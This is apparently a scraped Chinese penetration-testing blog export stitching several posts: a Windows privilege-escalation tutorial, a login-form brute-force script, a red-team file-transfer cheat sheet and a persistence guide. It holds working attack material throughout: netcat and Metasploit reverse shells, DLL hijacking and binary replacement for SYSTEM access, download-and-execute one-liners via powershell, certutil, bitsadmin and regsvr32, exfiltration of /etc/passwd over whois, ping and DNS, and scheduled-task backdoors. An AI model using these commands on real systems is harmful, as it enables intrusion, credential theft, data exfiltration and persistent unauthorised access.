RW BUILTIN\\Power Users SERVICE_ALL_ACCESS RW NT AUTHORITY\\LOCAL SERVICE SERVICE_ALL_ACCESS 此问题后来通过引入XP SP2解决，但是在SP0和SP1上，它可以用作通用本地权限提升漏洞。通过重新配置服务，我们可以让它以SYSTEM级别权限运行我们选择的任何二进制文件。 我们来看看这是如何在实践中完成的。在这种情况下，服务将执行netcat并打开具有SYSTEM级别权限的反向shell。其他选择当然是可能的。 C:> sc qc upnphost [SC] GetServiceConfig SUCCESS SERVICE_NAME: upnphost TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\WINDOWS\\System32\\svchost.exe -k LocalService LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Universal Plug and Play Device Host DEPENDENCIES : SSDPSRV SERVICE_START_NAME : NT AUTHORITY\\LocalService C:> sc config upnphost binpath= “C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe”[SC] ChangeServiceConfig SUCCESS C:> sc config upnphost obj= “.\\LocalSystem” password= “”[SC] ChangeServiceConfig SUCCESS C:> sc qc upnphost [SC] GetServiceConfig SUCCESS SERVICE_NAME: upnphost TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Universal Plug and Play Device Host DEPENDENCIES : SSDPSRV SERVICE_START_NAME : LocalSystem C:> net start upnphost ![img](http://www.fuzzysecurity.com/tutorials/images/priv01_big.png) Service Shell (upnphost) 即使配置不正确，我们也不会始终拥有对服务的完全访问权限。下图来自Brett Moore关于Windows权限升级的演示文稿，这些访问权限中的任何一个都将为我们提供一个SYSTEM shell。 ![img](http://www.fuzzysecurity.com/tutorials/images/priv02_big.png) 需要记住的重要一点是，我们会发现我们的受感染会话所属的用户组。如前所述，“Power Users”也被视为低权限用户组。“Power Users”有各自的漏洞，Mark Russinovich写了一篇关于这个主题的非常有趣的文章。 Power in Power用户（Mark Russinovich） - [这里](http://blogs.technet.com/b/markrussinovich/archive/2006/05/01/the-power-in-power-users.aspx) 最后我们将检查文件/文件夹权限，如果我们不能直接攻击操作系统，我们将让操作系统完成所有的工作。这里有很多内容，所以我将向您展示两种权限漏洞以及如何利用它们。一旦掌握了总体思路，您就可以将这些技术应用于其他情境。 对于我们的第一个例子，我们将复制Parvez从GreyHatHacker写的一篇文章的结果; “通过利用弱文件夹权限提升权限”。这是一个很好的特权升级写作，我强烈建议你[在这里](http://www.greyhathacker.net/?p=738)阅读他的帖子。 此示例是DLL劫持的特例。程序通常不能自己运行，它们需要很多资源（大多数是DLL，但也有专有文件）。如果程序或服务从我们具有写访问权限的目录加载文件，我们可以滥用它来弹出具有程序运行权限的shell。 通常，Windows应用程序将使用预定义的搜索路径来查找DLL，并且它将按特定顺序检查这些路径。DLL劫持通常是通过将恶意DLL放在其中一个路径中，同时确保在合法DLL之前找到DLL来实现的。通过让应用程序指定它所需的DLL的绝对路径，可以减轻此问题。 您可以在以下32位系统上看到DLL搜索顺序： 1 - 应用程序加载的目录 2 - 32位系统目录（C：\\ Windows \\ System32） 3 - 16位系统目录（C：\\ Windows \\ System） 4 - Windows目录（C：\\ Windows） 5 - 当前工作目录（CWD） 6 - PATH环境变量中的目录（系统然后用户） 有时会发生应用程序尝试加载机器上不存在的DLL。这可能由于多种原因而发生，例如，如果仅对某些插件或未安装的功能需要DLL。在这种情况下，Parvez发现某些Windows服务尝试加载默认安装中不存在的DLL。 由于有问题的DLL不存在，我们将最终遍历所有搜索路径。作为一个低权限用户，我们没有希望将恶意DLL放入1-4中，在这种情况下不可能出现这种情况，因为我们讨论的是Windows服务但是如果我们对Windows PATH中的任何目录都有写访问权限我们赢了。 让我们看看它在实践中是如何工作的，对于我们的示例，我们将使用试图加载wlbsctrl.dll的IKEEXT（IKE和AuthIP IPsec Keying Modules）服务。 This is on Windows 7 as low privilege user1.C:\\Users\\user1\\Desktop&gt; echo %username% user1 We have a win here since any non-default directory in “C:\\” will give write access to authenticatedusers. C:\\Users\\user1\\Desktop&gt; echo %path% C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Program Files\\OpenVPN\\bin;C:\\Python27 We can check our access permissions with accesschk or cacls.C:\\Users\\user1\\Desktop&gt; accesschk.exe -dqv “C:\\Python27” C:\\Python27 Medium Mandatory Level (Default) [No-Write-Up] RW BUILTIN\\Administrators FILE_ALL_ACCESS RW NT AUTHORITY\\SYSTEM FILE_ALL_ACCESS R BUILTIN\\Users FILE_LIST_DIRECTORY FILE_READ_ATTRIBUTES FILE_READ_EA FILE_TRAVERSE SYNCHRONIZE READ_CONTROL RW NT AUTHORITY\\Authenticated Users FILE_ADD_FILE FILE_ADD_SUBDIRECTORY FILE_LIST_DIRECTORY FILE_READ_ATTRIBUTES FILE_READ_EA FILE_TRAVERSE FILE_WRITE_ATTRIBUTES FILE_WRITE_EA DELETE SYNCHRONIZE READ_CONTROL C:\\Users\\user1\\Desktop&gt; cacls “C:\\Python27” C:\\Python27 BUILTIN\\Administrators:(ID)F BUILTIN\\Administrators:(OI)(CI)(IO)(ID)F NT AUTHORITY\\SYSTEM:(ID)F NT AUTHORITY\\SYSTEM:(OI)(CI)(IO)(ID)F BUILTIN\\Users:(OI)(CI)(ID)R NT AUTHORITY\\Authenticated Users:(ID)C NT AUTHORITY\\Authenticated Users:(OI)(CI)(IO)(ID)C Before we go over to action we need to check the status of the IKEEXT service. In this case we can seeit is set to “AUTO_START” so it will launch on boot! C:\\Users\\user1\\Desktop&gt; sc qc IKEEXT [SC] QueryServiceConfig SUCCESS SERVICE_NAME: IKEEXT TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Windows\\system32\\svchost.exe -k netsvcs LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : IKE and AuthIP IPsec Keying Modules DEPENDENCIES : BFE SERVICE_START_NAME : LocalSystem 现在我们知道满足必要条件我们可以生成恶意DLL并弹出shell！ root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=’127.0.0.1’ lport=’9988’ O Name: Windows Command Shell, Reverse TCP Inline Module: payload/windows/shell_reverse_tcp Platform: Windows Arch: x86Needs Admin: No Total size: 314 Rank: Normal Provided by: vlad902 &#x76;&#x6c;&#97;&#x64;&#x39;&#48;&#x32;&#x40;&#103;&#109;&#97;&#105;&#x6c;&#46;&#x63;&#x6f;&#x6d; sf &#x73;&#116;&#101;&#112;&#104;&#101;&#110;&#95;&#102;&#x65;&#119;&#x65;&#114;&#64;&#104;&#97;&#114;&#109;&#x6f;&#110;&#x79;&#115;&#x65;&#99;&#117;&#114;&#x69;&#116;&#121;&#x2e;&#x63;&#111;&#x6d; Basic options:Name Current Setting Required Description EXITFUNC process yes Exit technique: seh, thread, process, noneLHOST 127.0.0.1 yes The listen addressLPORT 9988 yes The listen port Description: Connect back to attacker and spawn a command shell root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=’127.0.0.1’ lport=’9988’ D &gt;/root/Desktop/evil.dll Created by msfpayload (http://www.metasploit.com).Payload: windows/shell_reverse_tcp Length: 314Options: {“lhost”=&gt;”127.0.0.1”, “lport”=&gt;”9988”} 将DLL传输到目标机器后，我们需要做的就是将其重命名为wlbsctrl.dll并将其移动到“C:\\Python27”。一旦完成，我们需要耐心地等待机器重新启动（或者我们可以尝试强制重启），我们将获得一个SYSTEM shell。 Again, this is as low privilege user1.C:\\Users\\user1\\Desktop&gt; dir Volume in drive C has no label. Volume Serial Number is 948D-A98F Directory of C:\\Users\\user1\\Desktop 02/18/2014 01:49 PM .02/18/2014 01:49 PM ..04/22/2013 09:39 AM 331,888 accesschk.exe02/18/2014 12:38 PM 14,336 evil.dll01/25/2014 12:46 AM 36,864 fubar.exe01/22/2014 08:17 AM incognito206/30/2011 01:52 PM 1,667,584 ncat.exe11/22/2013 07:39 PM 1,225 wmic_info.bat 5 File(s) 2,051,897 bytes 3 Dir(s) 73,052,160 bytes free C:\\Users\\user1\\Desktop&gt; copy evil.dll C:\\Python27\\wlbsctrl.dll 1 file(s) copied. C:\\Users\\user1\\Desktop&gt; dir C:\\Python27 Volume in drive C has no label. Volume Serial Number is 948D-A98F Directory of C:\\Python27 02/18/2014 01:53 PM .02/18/2014 01:53 PM ..10/20/2012 02:52 AM DLLs10/20/2012 02:52 AM Doc10/20/2012 02:52 AM include01/28/2014 03:45 AM Lib10/20/2012 02:52 AM libs04/10/2012 11:34 PM 40,092 LICENSE.txt04/10/2012 11:18 PM 310,875 NEWS.txt04/10/2012 11:31 PM 26,624 python.exe04/10/2012 11:31 PM 27,136 pythonw.exe04/10/2012 11:18 PM 54,973 README.txt10/20/2012 02:52 AM tcl10/20/2012 02:52 AM Tools04/10/2012 11:31 PM 49,664 w9xpopen.exe02/18/2014 12:38 PM 14,336 wlbsctrl.dll 7 File(s) 523,700 bytes 9 Dir(s) 73,035,776 bytes free 一切都已设置，我们现在需要做的就是等待系统重启。出于演示目的，我在下面包含了一个屏幕截图，我使用管理员命令提示符手动重启服务。 [![img](http://www.fuzzysecurity.com/tutorials/images/priv03_big.png) Service Shell (IKEEXT) 对于我们的最后一个例子，我们将查看计划的任务。回顾我们之前收集的结果，我们遇到了以下条目。 HostName: B33FTaskName: \\LogGrabberTFTPNext Run Time: 2/19/2014 9:00:00 AMStatus: ReadyLogon Mode: Interactive/BackgroundLast Run Time: N/ALast Result: 1Author: B33F\\b33fTask To Run: E:\\GrabLogs\\tftp.exe 10.1.1.99 GET log.out E:\\GrabLogs\\Logs\\log.txtStart In: N/AComment: N/AScheduled Task State: EnabledIdle Time: DisabledPower Management: Stop On Battery Mode, No Start On BatteriesRun As User: SYSTEMDelete Task If Not Rescheduled: EnabledStop Task If Runs X Hours and X Mins: 72:00:00Schedule: Scheduling data is not available in this format.Schedule Type: DailyStart Time: 9:00:00 AMStart Date: 2/17/2014End Date: N/ADays: Every 1 day(s)Months: N/ARepeat: Every: DisabledRepeat: Until: Time: DisabledRepeat: Until: Duration: DisabledRepeat: Stop If Still Running: Disabled 盒子上似乎有一个TFTP客户端连接到远程主机并抓取某种日志文件。我们可以看到此任务每天上午9点运行，并以SYSTEM级别权限（ouch）运行。让我们看看我们是否具有对此文件夹的写入权限。 C:\\Users\\user1\\Desktop&gt; accesschk.exe -dqv “E:\\GrabLogs” E:\\GrabLogs Medium Mandatory Level (Default) [No-Write-Up] RW BUILTIN\\Administrators FILE_ALL_ACCESS RW NT AUTHORITY\\SYSTEM FILE_ALL_ACCESS RW NT AUTHORITY\\Authenticated Users FILE_ADD_FILE FILE_ADD_SUBDIRECTORY FILE_LIST_DIRECTORY FILE_READ_ATTRIBUTES FILE_READ_EA FILE_TRAVERSE FILE_WRITE_ATTRIBUTES FILE_WRITE_EA DELETE SYNCHRONIZE READ_CONTROL R BUILTIN\\Users FILE_LIST_DIRECTORY FILE_READ_ATTRIBUTES FILE_READ_EA FILE_TRAVERSE SYNCHRONIZE READ_CONTROL C:\\Users\\user1\\Desktop&gt; dir “E:\\GrabLogs” Volume in drive E is More Volume Serial Number is FD53-2F00 Directory of E:\\GrabLogs 02/18/2014 11:34 PM .02/18/2014 11:34 PM ..02/18/2014 11:34 PM Logs02/18/2014 09:21 PM 180,736 tftp.exe 1 File(s) 180,736 bytes 3 Dir(s) 5,454,602,240 bytes free 显然，这是一个严重的配置问题，不需要将此任务作为SYSTEM运行，但更糟糕的是任何经过身份验证的用户都具有对该文件夹的写入权限。理想情况下，我会抓住TFTP客户端，后备PE可执行文件，同时确保它仍能完美运行，然后将其放回目标计算机上。但是，出于本示例的目的，我们可以使用metasploit生成的可执行文件简单地覆盖二进制文件。 root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=’127.0.0.1’ lport=’9988’ O Name: Windows Command Shell, Reverse TCP Inline Module: payload/windows/shell_reverse_tcp Platform: Windows Arch: x86Needs Admin: No Total size: 314 Rank: Normal Provided by: vlad902 &#118;&#108;&#97;&#x64;&#x39;&#x30;&#x32;&#x40;&#x67;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#x6d; sf &#x73;&#x74;&#x65;&#x70;&#x68;&#101;&#110;&#95;&#102;&#101;&#x77;&#101;&#114;&#x40;&#x68;&#x61;&#114;&#x6d;&#111;&#110;&#121;&#115;&#101;&#x63;&#x75;&#114;&#x69;&#116;&#121;&#x2e;&#x63;&#111;&#x6d; Basic options:Name Current Setting Required Description EXITFUNC process yes Exit technique: seh, thread, process, noneLHOST 127.0.0.1 yes The listen addressLPORT 9988 yes The listen port Description: Connect back to attacker and spawn a command shell root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=’127.0.0.1’ lport=’9988’ R | msfencode -texe &gt; /root/Desktop/evil-tftp.exe [*] x86/shikata_ga_nai succeeded with size 341 (iteration=1) 现在剩下的就是上传我们的恶意可执行文件并覆盖“E：\\ GrabLogs \\ tftp.exe”。一旦完成，我们可以在早上睡个好觉，然后在早上醒来。这里要记住的一件重要事情是我们检查我们试图妥协的盒子上的时间/时区。 C:\\Users\\user1\\Desktop&gt; dir Volume in drive C has no label. Volume Serial Number is 948D-A98F Directory of C:\\Users\\user1\\Desktop 02/19/2014 01:36 AM .02/19/2014 01:36 AM ..04/22/2013 09:39 AM 331,888 accesschk.exe02/19/2014 01:31 AM 73,802 evil-tftp.exe01/25/2014 12:46 AM 36,864 fubar.exe01/22/2014 08:17 AM incognito206/30/2011 01:52 PM 1,667,584 ncat.exe02/18/2014 12:38 PM 14,336 wlbsctrl.dll11/22/2013 07:39 PM 1,225 wmic_info.bat 6 File(s) 2,125,699 bytes 3 Dir(s) 75,341,824 bytes free C:\\Users\\user1\\Desktop&gt; copy evil-tftp.exe E:\\GrabLogs\\tftp.exe Overwrite E:\\GrabLogs\\tftp.exe? (Yes/No/All): Yes 1 file(s) copied. 为了演示此操作中的权限提升，我快速转发了系统时间。从下面的屏幕截图中我们可以看到我们在上午9点迅速提供了我们的SYSTEM shell。 ![img](http://www.fuzzysecurity.com/tutorials/images/priv04_big.png) Schtasks Shell (LogGrabberTFTP) 这两个示例应该让您了解在考虑文件/文件夹权限时我们需要查找的漏洞类型。您需要花时间检查Windows服务，计划任务和启动任务的所有bin路径。 我们已经能够看到accesschk是这里的首选工具。在结束之前，我想给你一些关于使用accesschk的最后一点。 When executing any of the sysinternals tools for the first time the user will be presented with a GUIpop-up to accept the EULA. This is obviously a big problem, however we can add an extra command line flagto automatically accept the EULA. accesschk.exe /accepteula … … … Find all weak folder permissions per drive.accesschk.exe -uwdqs Users c:\\accesschk.exe -uwdqs “Authenticated Users” c:\\ Find all weak file permissions per drive.accesschk.exe -uwqs Users c:*.accesschk.exe -uwqs “Authenticated Users” c:\\.* ` Final Thoughts 本指南旨在成为Windows权限升级的“基础”。如果你想真正掌握这门课程，你需要投入大量的工作和研究。与测试的所有方面一样，枚举是关键，你对目标的了解越多，你拥有的攻击途径越多，成功率就越高。 另请注意，您有时可能会将您的权限提升为管理员。从管理员升级到SYSTEM的权限不是问题，您始终可以重新配置服务或创建具有SYSTEM级别权限的计划任务。 现在出去弹出SYSTEM !!","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"/tags/渗透测试/"}]},{"title":"python遍历路径破解表单","slug":"python遍历路径破解表单","date":"2019-03-12T02:35:27.000Z","updated":"2019-03-12T02:53:37.017Z","comments":true,"path":"2019/03/python遍历路径破解表单/","link":"","permalink":"/2019/03/python遍历路径破解表单/","excerpt":"","text":"python遍历路径破解表单​ 首先是利用python遍历路径，采用字典爆破的形式，当然如果只是单纯的爆破路径，简单写一个多线程脚本就行了。这里考虑如何对爆破到的路径进行第二步利用，此处尝试对猜解到的路径进行表单发现及登陆爆破处理。 ​ 首先就是路径爆破，采用多线程队列，爆破路径，判断形式为200响应码。 while not self._queue.empty(): queue = self._queue.get(timeout=0.5) try: r = requests.get(self.url+queue,timeout=5, headers=self.headers) if r.status_code == 200: print &quot;[200] %s&quot; %(queue) soup = BeautifulSoup(r.content,&#39;html.parser&#39;) if soup.find(&#39;form&#39;): self.brute(soup, queue) 猜解到路径后交给brute方法处理，方法实现了一个css选择器，获取form表单中的input字段标签，提取标签参数组合成post参数值，然后提取表单中的action跳转页面，如没有页面默认在当前表单页提交。 input = soup.select(&quot;form input&quot;) for i in input: try: if i.attrs[&#39;type&#39;] == &quot;hidden&quot;: name, value = i.attrs[&#39;name&#39;], i.attrs[&#39;value&#39;] list_post.append(name+&#39;=&#39;+value) elif i.attrs[&#39;type&#39;] == &#39;password&#39;: name = i.attrs[&#39;name&#39;] list_post.append(name+&#39;=$$$&#39;) else: name = i.attrs[&#39;name&#39;] list_post.append(name+&#39;=%%%&#39;) except: continue for i in list_post: post = post + i + &#39;&amp;&#39; action = soup.find_all(&#39;form&#39;) for i in action: if i[&#39;action&#39;]: actiontag = i[&#39;action&#39;] else: actiontag = queue self.payload(post, actiontag) 获取参数值后，交给payload方法处理登陆，采用requests库的session登陆。获取cookie，先采用session请求获取cookie后，再采用session携带cookie进行请求提交。然后对输入的验证值进行判断是否为登陆成功。 for name in self.username(): post_user = post.replace(&#39;%%%&#39;,name.strip()) for pwd in self.password(): post_pwd = post_user.replace(&#39;$$$&#39;,pwd.strip()) session = requests.Session() session.get(self.url+&#39;/&#39;+action, headers=self.headers, verify=False) r = session.post(self.url+&#39;/&#39;+action, data=post_pwd, headers=self.headers, verify=False) if self.word in r.content: print &#39;[username] %s&#39; %name +&#39;\\r&#39; + &#39;[password] %s&#39; %pwd return 为了判断是否登陆成功，采用的人为输入判断字符串的形式。也就是脚本执行形式为 python xxx.py http://xxxx.com xxxxx","categories":[],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"红队后渗透测试中的文件传输技巧","slug":"红队后渗透测试中的文件传输技巧","date":"2019-03-08T01:25:06.000Z","updated":"2019-03-08T01:40:57.034Z","comments":true,"path":"2019/03/红队后渗透测试中的文件传输技巧/","link":"","permalink":"/2019/03/红队后渗透测试中的文件传输技巧/","excerpt":"","text":"原文链接：https://xax007.github.io/2019-01-13-post-exploitation-file-transfer-tips/ 在红队渗透测试当中往往需要最大化利用当前的环境绕过重兵防守的系统的防火墙、IDS、IPS等报警和监控系统进行文件传输，本文列出了多种利用操作系统默认自带的工具进行文件传输的方法。 搭建 HTTP serverPythonpython2: python -m SimpleHTTPServer 1337 以上命令会在当前目录启动 HTTP 服务，端口为 1337 python3: python -m http.server 1337 以上命令会在当前目录启动 HTTP 服务，端口为 1337 PHP 5.4+当 PHP 版本大于 5.4 是，可使用 PHP 在当前目录启动 HTTP 服务，端口为 1337 php -S 0.0.0.0:1337 Ruby下面的命令会在当前目录下启动 HTTP 服务，端口为 1337 ruby -rwebrick -e&#39;WEBrick::HTTPServer.new(:Port =&gt; 1337, :DocumentRoot =&gt; Dir.pwd).start&#39; Ruby 1.9.2+ruby -run -e httpd . -p 1337 Perlperl -MHTTP::Server::Brick -e &#39;$s=HTTP::Server::Brick-&gt;new(port=&gt;1337); $s-&gt;mount(&quot;/&quot;=&gt;{path=&gt;&quot;.&quot;}); $s-&gt;start&#39; perl -MIO::All -e &#39;io(&quot;:8080&quot;)-&gt;fork-&gt;accept-&gt;(sub { $_[0] &lt; io(-x $1 +? &quot;./$1 |&quot; : $1) if /^GET \\/(.*) / })&#39; Thanks to: http://stackoverflow.com/questions/8058793/single-line-python-webserver busybox httpdbusybox httpd -f -p 8000 本条来自:lvm 从 HTTP server 下载文件以下列出了在 Windows 和 Linux 系统下使用系统自带工具从 HTTP Server 下载文件的几种方法 Windowspowershell下载并执行: powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://1.2.3.4/5.exe&#39;,&#39;c:\\download\\a.exe&#39;);start-process &#39;c:\\download\\a.exe&#39; certutil下载并执行: certutil -urlcache -split -f http://1.2.3.4/5.exe c:\\download\\a.exe&amp;&amp;c:\\download\\a.exe bitsadmin下载并执行: bitsadmin /transfer n http://1.2.3.4/5.exe c:\\download\\a.exe &amp;&amp; c:\\download\\a.exe ⚠️ bitsadmin 的下载速度比较慢 regsvr32regsvr32 /u /s /i:http://1.2.3.4/5.exe scrobj.dll LinuxCurlcurl http://1.2.3.4/backdoor Wgetwget http://1.2.3.4/backdoor awk在使用 awk 进行下载文件时，首先使用以上列出的任意一条命令启动一个 HTTP Server awk &#39;BEGIN { RS = ORS = &quot;\\r\\n&quot; HTTPCon = &quot;/inet/tcp/0/127.0.0.1/1337&quot; print &quot;GET /secret.txt HTTP/1.1\\r\\nConnection: close\\r\\n&quot; |&amp; HTTPCon while (HTTPCon |&amp; getline &gt; 0) print $0 close(HTTPCon) }&#39; 效果： Setup HTTP PUT server以下列出了上传文件到 HTTP Server 的几种方法 使用 Nginx 搭建 HTTP PUT Servermkdir -p /var/www/upload/ # 创建目录 chown www-data:www-data /var/www/upload/ # 修改目录所属用户和组 cd /etc/nginx/sites-available # 进入 nginx 虚拟主机目录 # 写入配置到 file_upload 文件 cat &lt;&lt;EOF &gt; file_upload server { listen 8001 default_server; server_name kali; location / { root /var/www/upload; dav_methods PUT; } } EOF # 写入完毕 cd ../sites-enable # 进入 nginx 虚拟主机启动目录 ln -s /etc/nginx/sites-available/file_upload file_upload # 启用 file_upload 虚拟主机 systemctl start nginx # 启动 Nginx 使用 Python 搭建 HTTP PUT Server以下代码保存到 HTTPutServer.py 文件里: # ref: https://www.snip2code.com/Snippet/905666/Python-HTTP-PUT-test-server import sys import signal from threading import Thread from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler class PUTHandler(BaseHTTPRequestHandler): def do_PUT(self): length = int(self.headers[&#39;Content-Length&#39;]) content = self.rfile.read(length) self.send_response(200) with open(self.path[1:], &quot;w&quot;) as f: f.write(content) def run_on(port): print(&quot;Starting a HTTP PUT Server on {0} port {1} (http://{0}:{1}) ...&quot;.format(sys.argv[1], port)) server_address = (sys.argv[1], port) httpd = HTTPServer(server_address, PUTHandler) httpd.serve_forever() if __name__ == &quot;__main__&quot;: if len(sys.argv) &lt; 3: print(&quot;Usage:\\n\\tpython {0} ip 1337&quot;.format(sys.argv[0])) sys.exit(1) ports = [int(arg) for arg in sys.argv[2:]] try: for port_number in ports: server = Thread(target=run_on, args=[port_number]) server.daemon = True # Do not make us wait for you to exit server.start() signal.pause() # Wait for interrupt signal, e.g. KeyboardInterrupt except KeyboardInterrupt: print &quot;\\nPython HTTP PUT Server Stoped.&quot; sys.exit(1) 运行方法: $ python HTTPutServer.py 10.10.10.100 1337 Starting a HTTP PUT Server on 10.10.10.100 port 1337 (http://10.10.10.100:1337) ... 上传文件到 HTTP PUT serverLinuxCurl$ curl --upload-file secret.txt http://ip:port/ Wget$ wget --method=PUT --post-file=secret.txt http://ip:port/ WindowsPowershell$body = Get-Content secret.txt Invoke-RestMethod -Uri http://ip:port/secret.txt -Method PUT -Body $body 使用 Bash /dev/tcp 进行文件传输首先需要监听端口 接收端: nc -lvnp 1337 &gt; secret.txt 发送端: cat secret.txt &gt; /dev/tcp/ip/port 使用 SMB 协议进行文件传输搭建简易 SMB Server搭建简易SMB Server 需要用到 Impacket 项目的 smbserver.py 文件 Impacket 已默认安装在 Kali Linux 系统中 syntax: impacker-smbserver ShareName SharePath $ mkdir smb # 创建 smb 目录 $ cd smb # 进入 smb目录 $ impacket-smbserver share `pwd` # 在当前目录启动 SMB server，共享名称为 share 效果： 从 SMB server 下载文件copy \\\\IP\\ShareName\\file.exe file.exe 上传文件到 SMB servernet use x: \\\\IP\\ShareName copy file.txt x: net use x: /delete 使用 whois 命令进行文件传输graph LR A[Host A] – /etc/passwd –&gt; B[Host B] 接收端 Host B： nc -vlnp 1337 | sed &quot;s/ //g&quot; | base64 -d 发送端 Host A： whois -h 127.0.0.1 -p 1337 `cat /etc/passwd | base64` 效果： 使用 ping 命令进行文件传输graph LR A[Sender] – secret.txt –&gt; B[Reciver] 发送端: xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done 接收端: 以下代码保存到 ping_receiver.py import sys try: from scapy.all import * except: print(&quot;Scapy not found, please install scapy: pip install scapy&quot;) sys.exit(0) def process_packet(pkt): if pkt.haslayer(ICMP): if pkt[ICMP].type == 8: data = pkt[ICMP].load[-4:] print(f&#39;{data.decode(&quot;utf-8&quot;)}&#39;, flush=True, end=&quot;&quot;, sep=&quot;&quot;) sniff(iface=&quot;eth0&quot;, prn=process_packet) 执行方法: python3 ping_receiver.py 效果 使用 dig 命令进行文件传输graph LR A[Sender] – /etc/passwd –&gt; B[Reciver] 发送端: xxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1 +time=1 $line.gooogle.com; done 接收端: 以下代码使用了 python 的 scapy 模块，需要手动安装 代码保存到 dns_reciver.py 文件中 try: from scapy.all import * except: print(&quot;Scapy not found, please install scapy: pip install scapy&quot;) def process_packet(pkt): if pkt.haslayer(DNS): domain = pkt[DNS][DNSQR].qname.decode(&#39;utf-8&#39;) root_domain = domain.split(&#39;.&#39;)[1] if root_domain.startswith(&#39;gooogle&#39;): print(f&#39;{bytearray.fromhex(domain[:-13]).decode(&quot;utf-8&quot;)}&#39;, flush=True, end=&#39;&#39;) sniff(iface=&quot;eth0&quot;, prn=process_packet) 运行方法: python3 dns_reciver.py 效果： 使用 NetCat 进行文件传输graph LR Sender[A:10.10.10.100] – 1.txt –&gt; Reciver[B:10.10.10.200] 接受端: nc -l -p 1337 &gt; 1.txt 发送端： cat 1.txt | nc -l -p 1337 或者 nc 10.10.10.200 1337 &lt; 1.txt 在极端环境下，如果接受端没有 nc 可以使用 Bash 的 /dev/tcp 接收文件: cat &lt; /dev/tcp/10.10.10.200/1337 &gt; 1.txt","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"渗透之权限维持","slug":"渗透之权限维持","date":"2019-03-08T01:24:46.000Z","updated":"2019-03-08T01:40:48.490Z","comments":true,"path":"2019/03/渗透之权限维持/","link":"","permalink":"/2019/03/渗透之权限维持/","excerpt":"","text":"原文链接：渗透之权限维持杂谈 0x01 MSFpersistence msf内置的后渗透权限维持工具persistence Metsvc它是通过在已经获得shell的目标主机上开启了一个服务来提供后门的功能。run Metsvc -h Scheduleme &amp; Schtasksabusemsf中自动利用计划任务的后门程序，后面会聊到linux和windows平台的计划任务。 run scheduleme -h # 例子：上传nc并创建计划任务每一分钟执行一次 &#39;nc -e cmd.exe -L -p 8080&#39; run scheduleme -m 1 -e /tmp/nc.exe -o &quot;-e cmd.exe -L -p 8080&quot; run Schtasksabuse -h # 例子：每隔4秒执行一次calc.exe run schtasksabuse -t 192.168.2.7 -c &quot;cmd /c calc.exe&quot; -d 4 Mof_ps_persist 现在已经找不到这个利用模块，参考：https://github.com/khr0x40sh/metasploit-modules/blob/master/persistence/mof_ps_persist.rb Autorunscript获取shell的时候自动执行持续化脚本,可以被Autorunscript执行的命令目录在metasploit/scripts/meterpreter # persistence use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 192.168.2.101 set LPORT 5555 set ExitOnSession false set AutoRunScript persistence -r 192.168.2.101 -p 5556 -U -X -i 30 exploit # metsvc use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 192.168.2.101 set LPORT 5555 set ExitOnSession false set AutoRunScript metsvc -A exploit 0x02 计划任务无论是windows还是linux操作系统都提供计划任务功能，来实现定时或者周期性的执行一些指令。自然而然我们可以在计划任务中做手脚，埋后门。 windows 图形化工具：taskschd.msc 命令行工具：schtasks.exe SCHTASKS /parameter [arguments] 描述: 允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任 务。 参数列表: /Create 创建新计划任务。 /Delete 删除计划任务。 /Query 显示所有计划任务。 /Change 更改计划任务属性。 /Run 按需运行计划任务。 /End 中止当前正在运行的计划任务。 /ShowSid 显示与计划的任务名称相应的安全标识符。 /? 显示此帮助消息。 Examples: SCHTASKS SCHTASKS /? SCHTASKS /Run /? SCHTASKS /End /? SCHTASKS /Create /? SCHTASKS /Delete /? SCHTASKS /Query /? SCHTASKS /Change /? SCHTASKS /ShowSid /? Payload examples: SCHTASKS /Create /TN update /TR xx(待执行的命令) /DELAY ONLOGON /F /RL HIGHEST linux 一次性执行任务：at命令———&gt;atd进程 周期性执行任务：crontab命令———&gt;crond进程 在实际的渗透过程中我们更倾向于使用crontab at - 1.服务开启 service atd start - 2.基本格式 at [HH:MM] [yyyy-mm-dd] #没有指定年月日的，默认是当天的。 - 3.查询当前设置的at任务列表 atq #或at -l - 4.删除指定任务编号的at任务 atrm 编号 #或at -d - 5.查看计划任务的具体内容 at -c 任务号 - 6.使用文件中的命令作为计划任务（比较少用） at 时间 -f 文件 - 7.相关文件 /etc/at.deny：#该名单里面的人不可以使用 /etc/at.allow：#只有该名单里面的人可以使用 crontab 注意：（1）crontab 只会在/sbin、/bin、/usr/sbin、/usr/bin下查找命令，如果命令不在这些目录中，应该要使用绝对路径。（2）只有root用户可以管理其他用户的周期性任务（3）crontab在重启后之前的周期性任务无效，anacron可以弥补crontab的缺陷。配置文件：/etc/anacrontab。anacrontab会开机自动检查没有执行的计划任务，然乎逐一执行，这个过程是用户透明的。一般而言，crontab就已经可以满足基本的需求。 - 1.服务开启 service crond start - 2.编辑计划任务 crontab -e -u 用户名 - 3.查看计划任务 crontab -l -u 用户名 - 